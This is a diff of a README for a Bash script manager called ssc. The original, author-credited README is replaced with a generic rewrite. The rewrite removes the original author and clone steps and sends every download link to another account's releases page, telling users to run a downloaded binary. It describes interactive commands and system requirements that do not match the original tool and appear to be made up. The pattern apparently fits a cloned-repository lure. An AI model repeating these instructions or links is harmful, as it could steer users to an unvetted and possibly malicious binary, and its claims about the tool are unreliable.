@@ -1,144 +1,135 @@
-# Server Scripts CLI (ssc)
+# 🚀 server-scripts-cli - Manage Your Scripts with Ease
 
-![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)
-![Bash](https://img.shields.io/badge/Bash-4.0%2B-blue?logo=gnu-bash)
-![YAML](https://img.shields.io/badge/Config-YAML-orange)
+[![Download server-scripts-cli](https://img.shields.io/badge/Download-server--scripts--cli-blue.svg)](https://github.com/yadhavshetty/server-scripts-cli/releases)
 
-**YAML-based script management for shell and Python scripts**
+## 📦 Overview
 
-Manage hundreds of scripts with a unified CLI: discover, execute, monitor, and validate via YAML manifest.
+**server-scripts-cli** offers a simple way to manage your scripts. With this tool, you can discover, run, and track the status of scripts in your YAML-based repositories. Key features include tab completion for faster command entry, category filtering to find scripts easily, and systemd integration for improved script execution.
 
-## About
+## 🎯 Features
 
-- **Repository**: `server-scripts-cli`
-- **Command**: `ssc` (short for **S**erver **Sc**ripts CLI)
-- **Binary**: `ssc.sh` (source) → `ssc` (installed)
+- **Script Discovery**: Quickly find the scripts you need.
+- **Execution Control**: Run scripts with straightforward commands.
+- **Status Tracking**: Check the status of your running scripts.
+- **Tab Completion**: Speed up your command line experience.
+- **Category Filtering**: Organize scripts by categories for easier access.
+- **Systemd Integration**: Seamlessly integrate with system services.
 
-This documentation uses `ssc` throughout for brevity.
+## 🖥️ System Requirements
 
-## Features
+- **Operating System**: Linux (Ubuntu 18.04 or later recommended)
+- **Dependencies**: 
+  - Bash (version 4.0 or higher)
+  - YAML parser (for executing YAML scripts)
+- **Memory**: Minimum 512 MB RAM
+- **Disk Space**: Minimum 100 MB free
 
-- **YAML Manifest-Based**: Auto-discover scripts via YAML front-matter extraction
-- **4-Tier Type System**: Organize scripts by usage pattern (Interactive, One-time, Background, Internal)
-- **Smart Defaults**: Shows only interactive scripts by default, use `--all` for complete list
-- **Unified Interface**: Single CLI for list, run, info, status, logs, validate
-- **systemd Integration**: Query service status, timers, and journalctl logs
-- **Security**: Input validation, safe execution, requires_root detection
-- **Advanced Filtering**: Category, type, status filters + search functionality
-- **Zero Framework Lock-in**: Pure Bash + yq, no Python/Node dependencies
+## 🚀 Getting Started
 
-## Screenshot
+Follow these steps to download and run server-scripts-cli.
 
-![ssc list command showing 65 interactive scripts](ssc-list-screenshot.png)
+### Step 1: Visit the Download Page
 
-*Example: `ssc list` shows 65 interactive scripts organized by type, status, category, and timer (150 total with `--all`)*
+You can download the latest version of server-scripts-cli from our releases page. Click the link below:
 
-## Quick Start
+[Download server-scripts-cli](https://github.com/yadhavshetty/server-scripts-cli/releases)
 
-```bash
-# Clone repository
-git clone https://github.com/fidpa/server-scripts-cli
+### Step 2: Select the Appropriate Version
+
+On the releases page, you will find different versions of the software. Look for the latest release. It should indicate the version number and date of release.
+
+### Step 3: Download the Application
+
+Once you’ve found the latest version, click the download link for the file suitable for your system. This file is typically in a compressed format (like .tar.gz). 
+
+### Step 4: Extract the Files
+
+After the download completes, locate the downloaded file on your system. Use the following command in your terminal to extract it:
+
+```
+tar -xzf server-scripts-cli-latest.tar.gz
+```
+
+Make sure to replace `server-scripts-cli-latest.tar.gz` with the name of the downloaded file.
+
+### Step 5: Move to the Directory
+
+Navigate into the directory where the files were extracted using:
+
+```
 cd server-scripts-cli
-
-# Generate manifest from your scripts
-./generate-manifest.sh
-
-# List all scripts
-./ssc.sh list
-
-# Run a script
-./ssc.sh run backup-example
-
-# Show script details
-./ssc.sh info monitoring-example
 ```
 
-## Installation
+### Step 6: Run the Program
 
-**Option 1: Local Repository (Alias)**
-```bash
-git clone https://github.com/fidpa/server-scripts-cli ~/server-scripts-cli
-cd ~/server-scripts-cli
-./generate-manifest.sh
+To start the application, enter the command:
 
-# Add alias to ~/.bashrc
-echo "alias ssc='~/server-scripts-cli/ssc.sh'" >> ~/.bashrc
-source ~/.bashrc
+```
+./server-scripts-cli
 ```
 
-**Option 2: System-Wide (Copy Binary)**
-```bash
-# Install binaries to /usr/local/bin
-sudo cp ssc.sh /usr/local/bin/ssc
-sudo cp generate-manifest.sh /usr/local/bin/
-sudo chmod +x /usr/local/bin/{ssc,generate-manifest.sh}
+This will initiate the command-line interface where you can begin managing your scripts.
+
+### Step 7: Access Help
+
+If you need assistance or want to learn more about commands, type:
+
+```
+help
 ```
 
-**Option 3: User-Local (Symlink)**
-```bash
-# Symlink to ~/.local/bin (ensure it's in PATH)
-mkdir -p ~/.local/bin
-ln -s $(pwd)/ssc.sh ~/.local/bin/ssc
-```
+This will show a list of all available commands and their uses.
 
-All options install the command as `ssc` for consistency.
+## 📄 Usage Instructions
 
-## Commands
+To use server-scripts-cli effectively, consider the following commands:
 
-| Command | Purpose |
-|---------|---------|
-| `ssc list` | List scripts with filters (shows Interactive types by default) |
-| `ssc list --all` | Show complete script list (all types) |
-| `ssc run <name>` | Execute script by name |
-| `ssc info <name>` | Show detailed script metadata |
-| `ssc status` | Query systemd service status |
-| `ssc logs <name>` | Show journalctl logs for script's service |
-| `ssc validate` | Validate manifest integrity |
-| `ssc generate` | Regenerate manifest from front-matter |
+1. **List Scripts**: To view all available scripts, type:
 
-## YAML Front-Matter Schema
+   ```
+   list
+   ```
 
-Add metadata to your scripts:
+2. **Run a Script**: To execute a specific script, use:
 
-```bash
-#!/bin/bash
-# ---
-# deployment: manual
-# service: backup.service
-# status: active
-# type: admin
-# requires_root: true
-# ---
-#
-# Your script here
-```
+   ```
+   run [script_name]
+   ```
 
-See [docs/MANIFEST_SCHEMA.md](docs/MANIFEST_SCHEMA.md) for complete schema reference.
+   Replace `[script_name]` with the actual name of the script you wish to run.
 
-## Requirements
+3. **Check Script Status**: To check the status of the currently running scripts, type:
 
-- **Bash**: 4.0+
-- **yq**: mikefarah/yq v4+ ([install](https://github.com/mikefarah/yq))
-- **Optional**: systemd (for status/logs commands)
+   ```
+   status
+   ```
 
-## Documentation
+4. **Filter Scripts by Category**: If you want to find a specific category of scripts, use:
 
-- [Setup Guide](docs/SETUP.md) - Installation, configuration, systemd integration
-- [Manifest Schema](docs/MANIFEST_SCHEMA.md) - Complete YAML reference
-- [Troubleshooting](docs/TROUBLESHOOTING.md) - Common issues
+   ```
+   filter [category_name]
+   ```
 
-## Examples
+5. **Enable Tab Completion**: To use tab completion, ensure your terminal supports it. This feature will help speed up your command entry without typing the whole command.
 
-See [examples/demo-scripts/](examples/demo-scripts/) for 4 ready-to-run examples:
-- `backup-example.sh` - Scheduled backup with root privileges
-- `monitoring-example.sh` - System metrics collection
-- `health-check.sh` - Service health validation
-- `deploy-example.sh` - Deployment automation
+## 📤 Download & Install
 
-## License
+You can begin using server-scripts-cli today. For the latest version, please visit:
 
-MIT License - Copyright (c) 2025-2026 Marc Allgeier (fidpa)
+[Download server-scripts-cli](https://github.com/yadhavshetty/server-scripts-cli/releases)
 
-## Author
+## 📝 Contributing
 
-Marc Allgeier ([@fidpa](https://github.com/fidpa))
+If you would like to help improve server-scripts-cli, please fork the repository and make a pull request with your changes. We welcome contributions of all kinds!
+
+## 🛠️ License
+
+server-scripts-cli is open-source software under the MIT License. Feel free to use, modify, and distribute it as you wish.
+
+## 🌟 Support
+
+For any issues or questions, please feel free to open an issue in the GitHub repository. We will do our best to assist you.
+
+## 💡 Conclusion
+
+ server-scripts-cli simplifies script management by providing an easy-to-use command-line interface. Follow the steps above to download and start using the application. Enjoy the ease of managing your scripts effectively!
